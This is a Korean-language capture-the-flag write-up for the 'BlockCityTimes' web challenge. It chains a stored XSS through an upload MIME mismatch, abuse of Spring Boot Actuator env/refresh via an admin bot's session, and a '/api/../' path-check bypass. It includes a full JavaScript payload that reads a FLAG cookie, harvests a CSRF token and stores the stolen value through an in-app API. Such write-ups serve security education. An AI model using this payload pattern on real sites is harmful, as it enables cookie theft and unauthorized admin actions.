---
ctf_name: "2026-UMassCTF"
challenge_name: "BlockCityTimes"
category: "web"
difficulty: "medium"
author: "yeahhbean"
date: "2026-04-05"
points: 500
tags: [xss, stored-xss, spring-boot, actuator, path-traversal, csrf]
---

# BlockCityTimes

## 문제 설명

> 뉴스 플랫폼 서비스. 팀 토큰으로 인스턴스를 생성한 후 접근하는 구조.

- 인스턴스 매니저: http://blockcitytimes.web.ctf.umasscybersec.org:5000/
- 실제 대상: http://\<uuid\>.blockcitytimes.web.ctf.umasscybersec.org

## 풀이

### 분석

**인스턴스 생성 흐름**

초기 URL은 취약한 앱이 아닌 인스턴스 매니저였다. `ctfd_team_access_token`을 입력하면 `/instance`로 이동하고, Socket.IO `start_deploy` 이벤트를 보내면 팀 전용 앱 URL이 발급된다.

**두 개의 봇**

소스 분석 결과 두 종류의 관리자 봇이 존재한다.

- **editorial 봇** (`editorial/server.js`): 관리자 계정으로 로그인 후 업로드된 파일 URL을 Puppeteer로 직접 방문
- **report-runner 봇** (`developer/report-api.js`): 관리자 로그인 후 FLAG 쿠키를 심고 `BASE_URL + REPORT_ENDPOINT`로 이동

**파일 업로드 취약점**

`StoryController.java`에서 업로드 시 `file.getContentType()`이 `text/plain` 또는 `application/pdf`인지만 검사한다. 그런데 `/files/{filename}`으로 서빙할 때는 `Files.probeContentType(filePath)`를 사용하므로, `evil.html`을 `text/plain`으로 업로드하면 저장 후 `text/html`로 열린다. editorial 봇이 이 파일을 방문하므로 **Stored XSS** 가능.

**Actuator 노출**

`application.yml`에서 `management.endpoints.web.exposure.include: refresh, health, info, env`로 설정되어 있고, `SecurityConfig.java`에서 actuator 엔드포인트는 admin Basic Auth로만 보호된다. editorial 봇은 이미 관리자 세션을 가지고 있으므로, XSS 내에서 same-origin 요청으로 `/actuator/env`와 `/actuator/refresh`를 호출할 수 있다.

**`/admin/report` 경로 검사 우회**

`ReportController.java`는 `dev` 모드에서만 동작하고, `endpoint.startsWith("/api/")` 만 검사한다. 따라서 `/api/../files/evil.html`을 제출하면 서버 검사는 통과하고, 브라우저 URL 정규화로 실제로는 `/files/evil.html`이 열린다.

### 취약점

1. 업로드 시 MIME 검사와 서빙 시 Content-Type 판정 기준이 다름 → Stored XSS
2. 관리자 세션으로 Actuator `env` + `refresh` 호출 가능 → 런타임 설정 변경
3. `/admin/report`의 경로 검사가 `startsWith("/api/")` 뿐 → Path Traversal 우회
4. FLAG 쿠키를 가진 관리자 봇을 XSS 파일로 재유도 가능
5. `/api/tags/article/{id}` PUT 후 `/api/articles/{id}` GET으로 플래그 회수 가능

### 익스플로잇

**전체 흐름**

1. 팀 토큰으로 인스턴스 매니저 인증
2. Socket.IO `start_deploy`로 실제 앱 URL 생성
3. `evil.html`을 `text/plain`으로 업로드
4. editorial 봇이 파일을 열며 **첫 번째 XSS** 실행
5. XSS가 `/actuator/env`, `/actuator/refresh`로 앱을 `dev` 모드로 전환
6. XSS가 `/admin`에서 CSRF 토큰 파싱 후 `/admin/report`에 `/api/../files/evil.html` 제출
7. report-runner 봇이 FLAG 쿠키를 심은 채 `evil.html` 방문
8. **두 번째 XSS**가 `document.cookie`에서 FLAG 값을 읽고 `/api/tags/article/1`에 저장
9. 공격자가 `/api/articles/1` 조회 후 태그에서 플래그 획득

**페이로드 (`evil.html`)**

```html
<script>
  (async () => {
    const currentPath = location.pathname;
    const cookieString = document.cookie || "";
    const flagMatch = cookieString.match(/(?:^|;\s*)FLAG=([^;]+)/);

    if (flagMatch) {
      const flagValue = decodeURIComponent(flagMatch[1]);
      await fetch("/api/tags/article/1", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify([flagValue]),
      });
      return;
    }

    await fetch("/actuator/env", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: "app.active-config", value: "dev" }),
    });

    await fetch("/actuator/refresh", { method: "POST" });

    const adminHtml = await fetch("/admin").then((r) => r.text());
    const csrf = adminHtml.match(/name="_csrf" value="([^"]+)"/)[1];

    const params = new URLSearchParams();
    params.set("_csrf", csrf);
    params.set("endpoint", "/api/.." + currentPath);

    await fetch("/admin/report", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: params.toString(),
    });
  })();
</script>
```

## 플래그

```
UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}
```

## 배운 점

- 파일 업로드 시 MIME 타입 검사와 실제 서빙 시 Content-Type 결정 로직이 다르면 XSS로 이어질 수 있다.
- Spring Boot Actuator가 노출되어 있고 관리자 세션에서 접근 가능하면, 런타임 설정을 XSS로 변경할 수 있다.
- 경로 검사를 `startsWith`로만 하면 `../` 우회에 취약하다.
- 플래그를 외부로 유출하지 않고 서비스 내 공개 API에 저장해 회수하는 방식도 유효하다.
